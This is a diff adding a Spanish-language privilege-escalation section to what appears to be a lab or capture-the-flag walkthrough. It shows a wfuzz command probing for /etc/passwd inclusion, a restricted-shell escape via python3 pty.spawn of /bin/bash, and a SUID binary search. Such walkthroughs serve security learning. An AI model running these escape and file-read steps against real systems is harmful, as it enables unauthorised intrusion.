@@ -1612,3 +1612,12 @@ wfuzz -u http://192.168.56.21/index.php -d 'FUZZ=/etc/passwd' -w /opt/zd/wfuzz.t
 
 
 
+# Escalada de privilegios 
+Al intentar listar los archivos del sistema con el bit SUID habilitado, parece que se obtiene un error de permisos debido a encontrarse en una rbash (restricted shell). Por ello, primero se escapa de esta utilizando Python para abrir una Bash convencional.
+
+find / -perm -4000 2>/dev/null
+(restricción por rbash)
+
+
+python3 --version
+python3 -c 'import pty;pty.spawn("/bin/bash")
